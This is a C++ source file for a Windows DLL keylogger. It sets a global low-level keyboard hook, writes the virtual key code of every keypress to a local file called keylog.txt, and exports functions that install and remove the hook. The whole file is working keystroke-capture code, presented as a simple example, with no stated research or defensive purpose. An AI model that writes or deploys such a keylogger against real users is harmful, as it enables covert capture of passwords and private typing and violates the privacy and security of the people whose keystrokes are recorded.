// KeyLoggerDLL.cpp
#include <windows.h>
#include <fstream>
#include <mutex>

HHOOK hHook = NULL;
std::mutex fileMutex;

// Helper to log key to file safely
void LogKey(int vkCode) {
    std::lock_guard<std::mutex> lock(fileMutex);

    // Open file in append mode
    std::ofstream logFile("keylog.txt", std::ios::app);
    if (!logFile.is_open()) return;

    // Simple example: write virtual key code as number
    logFile << vkCode << " ";
    logFile.close();
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        LogKey(p->vkCode);
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

extern "C" __declspec(dllexport) void SetHook() {
    if (!hHook) {
        hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    }
}

extern "C" __declspec(dllexport) void RemoveHook() {
    if (hHook) {
        UnhookWindowsHookEx(hHook);
        hHook = NULL;
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    return TRUE;
}

